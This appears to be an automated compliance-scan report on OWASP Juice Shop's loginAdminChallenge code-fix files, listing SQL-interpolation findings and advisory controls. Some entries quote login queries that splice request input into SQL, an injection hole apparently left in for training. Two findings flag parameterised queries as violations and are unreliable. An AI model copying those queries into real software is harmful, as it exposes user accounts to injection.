"IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/data/static/codefixes/loginAdminChallenge_4_correct.ts`
**Scanned at**: 2026-10-11T16:35:11.314997+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 15 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 15
models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = $2 AND deletedAt IS NULL`,
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 15, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/data/static/codefixes/loginAdminChallenge_3.ts`
**Scanned at**: 2026-10-11T16:35:12.054614+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 15 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 15
models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = $2 AND deletedAt IS NULL`,
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 15, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/data/static/codefixes/loginAdminChallenge_2.ts`
**Scanned at**: 2026-10-11T16:35:11.734089+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 15 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 15
models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`,
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 15, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/data/static/codefixes/loginAdminChallenge_1.ts`
**Scanned at**: 2026-10-11T16:35:11.851808+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 18 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 18
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: t...
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
